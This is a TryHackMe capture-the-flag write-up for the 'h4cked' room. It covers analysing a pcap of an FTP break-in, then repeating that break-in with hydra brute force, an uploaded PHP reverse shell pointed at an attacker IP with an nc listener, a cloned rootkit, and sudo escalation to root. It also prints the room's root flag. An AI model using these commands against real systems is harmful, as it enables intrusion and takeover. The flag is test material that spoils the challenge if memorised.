## h4cked - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/h4cked)

**IP: 10.10.73.168**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Wireshark <br>

**Tools Used**: Nmap, Wireshark, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🌐 Pcap file analysing

- For this part of the challenge, all answers can be found in these 3 packets.

  ```
  220 Hello FTP World!

  USER jenny
  
  331 Please specify the password.
  
  PASS 654321
  
  530 Login incorrect.
  
  USER jenny
  
  331 Please specify the password.
  
  PASS jessica
  
  530 Login incorrect.
  
  What is the user's password? -> password123
  
  220 Hello FTP World!
  
  USER jenny
  
  331 Please specify the password.
  
  PASS password123
  
  230 Login successful.
  
  SYST
  
  215 UNIX Type: L8
  
  PWD
  
  257 "/var/www/html" is the current directory
  
  PORT 192,168,0,147,225,49
  
  200 PORT command successful. Consider using PASV.
  
  LIST -la
  
  150 Here comes the directory listing.
  226 Directory send OK.
  
  TYPE I
  
  200 Switching to Binary mode.
  
  PORT 192,168,0,147,196,163
  
  200 PORT command successful. Consider using PASV.
  
  STOR shell.php
  
  150 Ok to send data.
  226 Transfer complete.
  
  SITE CHMOD 777 shell.php
  
  200 SITE CHMOD command ok.
  
  QUIT
  
  221 Goodbye.
  ```

  ```
  ftp-data filter

  [SNIP!]
  
  // Usage
  // -----
  // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
  
  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '192.168.0.147';  // CHANGE THIS
  $port = 80;       // CHANGE THIS
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = 'uname -a; w; id; /bin/sh -i';
  $daemon = 0;
  $debug = 0;
  
  [SNIP!]
  ```

  ```
  Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
   22:26:54 up  2:21,  1 user,  load average: 0.02, 0.07, 0.08
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  jenny    tty1     -                20:06   37.00s  1.00s  0.14s -bash
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ 
  whoami
  
  www-data
  $ 
  ls -la
  
  total 1529956
  drwxr-xr-x  23 root root       4096 Feb  1 19:52 .
  drwxr-xr-x  23 root root       4096 Feb  1 19:52 ..
  drwxr-xr-x   2 root root       4096 Feb  1 20:11 bin
  drwxr-xr-x   3 root root       4096 Feb  1 20:15 boot
  drwxr-xr-x  18 root root       3880 Feb  1 20:05 dev
  drwxr-xr-x  94 root root       4096 Feb  1 22:23 etc
  drwxr-xr-x   3 root root       4096 Feb  1 20:05 home
  lrwxrwxrwx   1 root root         34 Feb  1 19:52 initrd.img -> boot/initrd.img-4.15.0-135-generic
  lrwxrwxrwx   1 root root         33 Jul 25  2018 initrd.img.old -> boot/initrd.img-4.15.0-29-generic
  drwxr-xr-x  22 root root       4096 Feb  1 22:06 lib
  drwxr-xr-x   2 root root       4096 Feb  1 20:08 lib64
  drwx------   2 root root      16384 Feb  1 19:49 lost+found
  drwxr-xr-x   2 root root       4096 Jul 25  2018 media
  drwxr-xr-x   2 root root       4096 Jul 25  2018 mnt
  drwxr-xr-x   2 root root       4096 Jul 25  2018 opt
  dr-xr-xr-x 117 root root          0 Feb  1 20:23 proc
  drwx------   3 root root       4096 Feb  1 22:20 root
  drwxr-xr-x  29 root root       1040 Feb  1 22:23 run
  drwxr-xr-x   2 root root      12288 Feb  1 20:11 sbin
  drwxr-xr-x   4 root root       4096 Feb  1 20:06 snap
  drwxr-xr-x   3 root root       4096 Feb  1 20:07 srv
  -rw-------   1 root root 1566572544 Feb  1 19:52 swap.img
  dr-xr-xr-x  13 root root          0 Feb  1 20:05 sys
  drwxrwxrwt   2 root root       4096 Feb  1 22:25 tmp
  drwxr-xr-x  10 root root       4096 Jul 25  2018 usr
  drwxr-xr-x  14 root root       4096 Feb  1 21:54 var
  lrwxrwxrwx   1 root root         31 Feb  1 19:52 vmlinuz -> boot/vmlinuz-4.15.0-135-generic
  lrwxrwxrwx   1 root root         30 Jul 25  2018 vmlinuz.old -> boot/vmlinuz-4.15.0-29-generic
  $ 
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  
  www-data@wir3:/$ 
  su jenny
  
  su jenny
  Password: 
  password123
  
  
  jenny@wir3:/$ 
  sudo -l
  
  sudo -l
  [sudo] password for jenny: 
  password123
  
  
  Matching Defaults entries for jenny on wir3:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jenny may run the following commands on wir3:
      (ALL : ALL) ALL
  jenny@wir3:/$ 
  sudo su
  
  sudo su
  root@wir3:/# 
  whoami
  
  whoami
  root
  root@wir3:/# 
  cd
  
  cd
  root@wir3:~# 
  git clone https://github.com/f0rb1dd3n/Reptile.git
  ```


## 🔍 Enumeration

- Starting with Nmap scan. Gobuster did nothing.

  ```
  nmap -sC -sV -T5 -p- 10.10.73.168

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 2.0.8 or later
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  ```
  
- Now, brute force FTP credentials.

  ```
  hydra -l jenny -P /rockyou.txt ftp://10.10.73.168
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-20 22:04:17
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
  [DATA] attacking ftp://10.10.73.168:21/
  [21][ftp] host: 10.10.73.168   login: jenny   password: 987654321
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-20 22:04:42
  ```
  
- Perfect, let's login and see what's there.

  ```
  ftp> pwd
  Remote directory: /var/www/html
  ftp> ls -al
  229 Entering Extended Passive Mode (|||19710|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 1000     1000         4096 Feb 01  2021 .
  drwxr-xr-x    3 0        0            4096 Feb 01  2021 ..
  -rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
  -rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
  226 Directory send OK.
  ftp> get shell.php
  local: shell.php remote: shell.php
  229 Entering Extended Passive Mode (|||10140|)
  150 Opening BINARY mode data connection for shell.php (5493 bytes).
  100% |************************************************************************|  5493        5.14 MiB/s    00:00 ETA
  226 Transfer complete.
  5493 bytes received in 00:00 (109.87 KiB/s)
  ```

- Download this shell to your machine since we are going to edit and get reverse shell. I explored FTP hoping that I will find something useful but I was unlucky.

---

## ⚙️ Shell Access

- Getting webshell here is simple. We already have a shell, change IP and port and put it back to the server with FTP. After that just visit the web directory and you'll get a connection.

  ```
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> put shell.php
  local: shell.php remote: shell.php
  229 Entering Extended Passive Mode (|||25994|)
  150 Ok to send data.
  100% |************************************************************************|  5493       17.57 MiB/s    00:00 ETA
  226 Transfer complete.

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.73.168] 38594
  Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
   21:16:59 up 18 min,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ whoami
  www-data
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```
  
- This is the directory you need to visit `http://10.10.73.168/shell.php`. Now let's get that root flag.

---

## 👑 Root Privilege Escalation

- This one is pretty straightforward, I literally wasted time enumerating the machine before realising I can just switch to `jenny` since password is the same, right?

  ```
  www-data@wir3:/$ su jenny
  Password: 
  jenny@wir3:/$ whoami
  jenny
  jenny@wir3:/$ id
  uid=1000(jenny) gid=1000(jenny) groups=1000(jenny),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
  ```
  
- Getting root is even easier, run `sudo -l` and you'll see.

  ```
  jenny@wir3:/$ sudo -l
  [sudo] password for jenny: 
  Matching Defaults entries for jenny on wir3:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jenny may run the following commands on wir3:
      (ALL : ALL) ALL
  jenny@wir3:/$ sudo su
  root@wir3:/# cat root/root.txt
  cat: root/root.txt: No such file or directory
  root@wir3:/# cat /root/root.txt
  cat: /root/root.txt: No such file or directory
  root@wir3:/# pwd
  /
  ```
  
- Now go get that flag!

---

## 🏁 Flags

- **Root Flag**: `ebcefd66ca4b559d17b440b6e67fd0fd`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, pretty basic room.`

- What did I learn?
  `Nothing new, just sharpening my Wireshark skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
